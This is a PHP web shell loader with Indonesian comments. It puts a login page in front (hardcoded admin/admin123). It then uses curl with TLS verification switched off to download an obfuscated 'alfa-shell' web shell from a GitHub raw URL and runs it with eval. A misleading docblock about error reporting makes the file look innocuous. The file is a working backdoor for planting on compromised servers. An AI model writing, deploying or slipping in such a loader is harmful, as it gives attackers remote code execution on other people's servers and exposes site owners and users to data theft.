<?php
session_start();

// Fungsi untuk memeriksa autentikasi
function isAuthenticated() {
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
}

// Fungsi untuk menampilkan halaman login
function showLogin() {
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f4; }
            .login-box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; }
            .login-box h2 { margin-bottom: 20px; text-align: center; }
            .login-box input[type="text"], .login-box input[type="password"] { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; }
            .login-box input[type="submit"] { width: 100%; padding: 10px; background: #28a745; border: none; color: white; font-size: 16px; cursor: pointer; border-radius: 4px; }
            .login-box input[type="submit"]:hover { background: #218838; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>Login</h2>
            <form method="POST" action="">
                <input type="text" name="username" placeholder="Username" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>';
}

// Cek apakah pengguna sudah terotentikasi
if (!isAuthenticated()) {
    // Jika pengguna mengirimkan formulir login
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';

        // Validasi kredensial
        if ($username === 'admin' && $password === 'admin123') {
            $_SESSION['authenticated'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']); // Redirect setelah login berhasil
            exit();
        } else {
            echo '<script>alert("Username atau Password salah!");</script>';
            showLogin();
            exit();
        }
    } else {
        // Tampilkan halaman login jika belum login
        showLogin();
        exit();
    }
}

// Jika pengguna sudah terotentikasi, tampilkan konten asli
/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($conn, CURLOPT_COOKIEJAR, $GLOBALS['coki']);
        curl_setopt($conn, CURLOPT_COOKIEFILE, $GLOBALS['coki']);
        $url_get_contents_data = (curl_exec($conn));
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

$a = geturlsinfo('https://raw.githubusercontent.com/nicxlau/alfa-shell/refs/heads/master/alfa-obfuscated.php');
eval('?>' . $a);
eval('?>' . $a);
?>
